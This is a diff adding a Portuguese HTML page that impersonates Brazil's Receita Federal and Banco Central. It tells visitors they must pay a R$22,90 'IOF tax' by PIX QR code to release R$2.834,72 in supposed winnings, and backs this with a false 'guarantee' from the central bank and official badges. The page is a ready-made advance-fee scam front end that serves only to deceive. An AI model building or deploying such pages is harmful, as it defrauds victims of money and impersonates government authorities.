@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <meta name="format-detection" content="telephone=no" />
+    <link rel="stylesheet" href="css/iof.css" />
+    <title>IOF - Imposto Obrigatório</title>
+  </head>
+  <body>
+    <div id="iof-screen" class="iof-container">
+      <header class="iof-header">
+        <img
+          src="images/receitafederal.png"
+          alt="Receita Federal"
+          class="iof-header-logo"
+        />
+      </header>
+
+      <main class="iof-main">
+        <div class="iof-alert">
+          <svg
+            class="iof-alert-icon"
+            width="20"
+            height="20"
+            viewBox="0 0 20 20"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M10 0C4.48 0 0 4.48 0 10C0 15.52 4.48 20 10 20C15.52 20 20 15.52 20 10C20 4.48 15.52 0 10 0ZM11 15H9V13H11V15ZM11 11H9V5H11V11Z"
+              fill="#D97706"
+            />
+          </svg>
+          <span class="iof-alert-text">Imposto (IOF) obrigatório</span>
+        </div>
+
+        <div class="iof-content">
+          <h1 class="iof-title">Imposto sobre Operações Financeiras (IOF)</h1>
+
+          <p class="iof-description">
+            O pagamento do Imposto sobre Operações Financeiras (IOF) é
+            obrigatório e exigido pelo Banco Central do Brasil (Lei nº 8.894/94)
+          </p>
+
+          <p class="iof-required">
+            * É necessário realizar o pagamento do IOF para receber o valor
+            acumulado.
+          </p>
+
+          <div class="iof-card">
+            <h2 class="iof-card-title">Resumo</h2>
+
+            <div class="iof-summary-row">
+              <span class="iof-summary-label">Valor ganho</span>
+              <span class="iof-summary-value">R$2.834,72</span>
+            </div>
+
+            <div class="iof-summary-row iof-negative">
+              <span class="iof-summary-label">Valor a ser pago (IOF)</span>
+              <span class="iof-summary-value iof-negative-value">- R$22,90</span>
+              <div class="iof-summary-sublabel">
+                Imposto sobre Operações Financeiras
+              </div>
+            </div>
+
+            <div class="iof-divider"></div>
+
+            <div class="iof-summary-row iof-total">
+              <span class="iof-summary-label">Total a receber</span>
+              <span class="iof-summary-value">R$2.811,82</span>
+            </div>
+
+            <div class="iof-info-box">
+              <svg
+                class="iof-info-icon"
+                width="16"
+                height="16"
+                viewBox="0 0 16 16"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <circle cx="8" cy="8" r="8" fill="#3B82F6" />
+                <path
+                  d="M8 4C8.55 4 9 4.45 9 5C9 5.55 8.55 6 8 6C7.45 6 7 5.55 7 5C7 4.45 7.45 4 8 4ZM7 7H9V12H7V7Z"
+                  fill="white"
+                />
+              </svg>
+              <span class="iof-info-text"
+                >O pagamento de R$22,90 será processado via PIX de forma
+                imediata.</span
+              >
+            </div>
+          </div>
+
+          <div class="iof-card">
+            <div class="iof-guarantee">
+              <svg
+                class="iof-check-icon"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <circle cx="12" cy="12" r="12" fill="#10B981" />
+                <path
+                  d="M9 12L11 14L15 10"
+                  stroke="white"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+              <div class="iof-guarantee-content">
+                <h3 class="iof-guarantee-title">Garantia de recebimento</h3>
+                <p class="iof-guarantee-text">
+                  O valor ganho de R$2.811,82 é garantido pelo Banco Central do
+                  Brasil
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div class="iof-card">
+            <h3 class="iof-payment-title">Método de pagamento</h3>
+
+            <div class="iof-pix-method">
+              <img src="images/pix-logo.svg" alt="PIX" class="iof-pix-logo" />
+              <div class="iof-pix-info">
+                <svg
+                  class="iof-info-icon"
+                  width="16"
+                  height="16"
+                  viewBox="0 0 16 16"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <circle cx="8" cy="8" r="8" fill="#6B7280" />
+                  <path
+                    d="M8 4C8.55 4 9 4.45 9 5C9 5.55 8.55 6 8 6C7.45 6 7 5.55 7 5C7 4.45 7.45 4 8 4ZM7 7H9V12H7V7Z"
+                    fill="white"
+                  />
+                </svg>
+                <p class="iof-pix-text">
+                  Pague com PIX! Os pagamentos são simples, práticos e realizados
+                  em segundos.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div class="iof-terms">
+            <label class="iof-checkbox-label">
+              <input type="checkbox" id="iof-terms-checkbox" class="iof-checkbox" />
+              <span class="iof-checkbox-custom"></span>
+              <span class="iof-checkbox-text">
+                Concordo com os termos, incluindo pagar o Imposto sobre Operações
+                Financeiras (IOF), necessário para completar o saque em
+                conformidade com as regulamentações vigentes.
+              </span>
+            </label>
+          </div>
+
+          <button
+            type="button"
+            id="iof-pay-button"
+            class="iof-button iof-button-disabled"
+            disabled
+          >
+            Pagar Imposto
+          </button>
+        </div>
+      </main>
+    </div>
+
+    <div id="pix-screen" class="pix-container" style="display: none">
+      <div class="pix-preloader-container">
+        <div class="pix-preloader-box">
+          <div class="pix-preloader-spinner"></div>
+          <p class="pix-preloader-text">Gerando QRCode de pagamento...</p>
+        </div>
+      </div>
+
+      <div class="pix-payment-wrapper" style="display: none">
+        <div class="pix-header">
+          <button type="button" class="pix-back-button" id="pix-back-button">
+            <svg
+              width="24"
+              height="24"
+              viewBox="0 0 24 24"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                d="M15 18L9 12L15 6"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </button>
+          <h2 class="pix-header-title">Pagamento PIX</h2>
+          <div class="pix-header-spacer"></div>
+        </div>
+
+        <div class="pix-content">
+          <div class="pix-amount-box">
+            <div class="pix-amount-label">Valor a pagar</div>
+            <div class="pix-amount-value">R$ 22,90</div>
+            <div class="pix-amount-description">Imposto sobre Operações Financeiras (IOF)</div>
+          </div>
+
+          <div class="pix-qrcode-box">
+            <div id="pix-qrcode" class="pix-qrcode"></div>
+            <p class="pix-qrcode-instruction">
+              Escaneie o QR Code com o app do seu banco
+            </p>
+          </div>
+
+          <div class="pix-divider">
+            <span class="pix-divider-text">ou</span>
+          </div>
+
+          <div class="pix-code-box">
+            <div class="pix-code-label">Código PIX Copia e Cola</div>
+            <div class="pix-code-wrapper">
+              <input
+                type="text"
+                id="pix-code-input"
+                class="pix-code-input"
+                readonly
+              />
+              <button type="button" id="pix-copy-button" class="pix-copy-button">
+                <svg
+                  width="20"
+                  height="20"
+                  viewBox="0 0 20 20"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <path
+                    d="M13 0H2C0.9 0 0 0.9 0 2V14H2V2H13V0ZM16 4H6C4.9 4 4 4.9 4 6V18C4 19.1 4.9 20 6 20H16C17.1 20 18 19.1 18 18V6C18 4.9 17.1 4 16 4ZM16 18H6V6H16V18Z"
+                    fill="currentColor"
+                  />
+                </svg>
+                <span class="pix-copy-text">Copiar</span>
+              </button>
+            </div>
+            <p class="pix-code-copied" id="pix-code-copied" style="display: none">
+              ✓ Código copiado!
+            </p>
+          </div>
+
+          <div class="pix-info-alert">
+            <svg
+              class="pix-info-alert-icon"
+              width="20"
+              height="20"
+              viewBox="0 0 20 20"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <circle cx="10" cy="10" r="10" fill="#3B82F6" />
+              <path
+                d="M10 5C10.55 5 11 5.45 11 6C11 6.55 10.55 7 10 7C9.45 7 9 6.55 9 6C9 5.45 9.45 5 10 5ZM9 8H11V15H9V8Z"
+                fill="white"
+              />
+            </svg>
+            <p class="pix-info-alert-text">
+              Após realizar o pagamento, você será automaticamente redirecionado
+              para a próxima etapa em alguns segundos.
+            </p>
+          </div>
+
+          <div class="pix-security-badges">
+            <img src="images/bacen.png" alt="Banco Central" class="pix-badge-img" />
+            <img src="images/gov-br.webp" alt="Gov.br" class="pix-badge-img" />
+            <img
+              src="images/receitafederal.png"
+              alt="Receita Federal"
+              class="pix-badge-img"
+            />
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <script type="module" src="js/iof.js"></script>
+  </body>
+</html>
